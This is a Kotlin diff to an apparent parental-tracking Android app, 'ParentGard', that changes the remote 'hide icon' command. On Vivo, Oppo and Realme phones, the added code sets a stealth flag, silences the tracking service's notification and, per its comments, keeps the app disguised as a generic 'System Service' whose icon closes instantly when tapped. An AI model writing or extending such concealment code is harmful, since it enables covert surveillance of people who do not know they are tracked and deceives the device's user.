@@ -743,12 +743,19 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                     } catch (_: Exception) {}
                 }
             } else {
-                // Non-Samsung: disable only the LauncherAlias component. The package stays
-                // enabled so camera / accessibility service / services keep working normally.
-                pm.setComponentEnabledSetting(
-                    android.content.ComponentName(ctx.packageName, LAUNCHER_ALIAS),
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP)
+                // Non-Samsung (Vivo/Oppo/Realme): launcher caches icons and ignores
+                // component-disable, so the icon can't be removed. App is disguised as a
+                // generic "System Service". Hiding just sets the stealth flag + silent
+                // notification; the disguised icon stays and tapping it closes instantly.
+                ctx.getSharedPreferences("FlutterSharedPreferences", android.content.Context.MODE_PRIVATE)
+                    .edit().putBoolean("flutter.pm_stealth_mode", true).apply()
+                val stealthIntent = android.content.Intent(ctx, TrackingForegroundService::class.java)
+                    .apply { action = TrackingForegroundService.ACTION_STEALTH }
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    ctx.startForegroundService(stealthIntent)
+                } else {
+                    ctx.startService(stealthIntent)
+                }
             }
             """{"type":"ok","message":"ParentGard icon hidden"}"""
         } else {
@@ -772,10 +779,23 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                     } catch (_: Exception) {}
                 }
             } else {
-                pm.setComponentEnabledSetting(
-                    android.content.ComponentName(ctx.packageName, LAUNCHER_ALIAS),
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP)
+                // Clear stealth flag and signal service to restore normal notification.
+                ctx.getSharedPreferences("FlutterSharedPreferences", android.content.Context.MODE_PRIVATE)
+                    .edit().putBoolean("flutter.pm_stealth_mode", false).apply()
+                val showIntent = android.content.Intent(ctx, TrackingForegroundService::class.java)
+                    .apply { action = TrackingForegroundService.ACTION_SHOW }
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    ctx.startForegroundService(showIntent)
+                } else {
+                    ctx.startService(showIntent)
+                }
+                // Re-enable alias in case it was disabled by an older build.
+                try {
+                    pm.setComponentEnabledSetting(
+                        android.content.ComponentName(ctx.packageName, LAUNCHER_ALIAS),
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP)
+                } catch (_: Exception) {}
             }
             """{"type":"ok","message":"ParentGard icon visible"}"""
         } else {
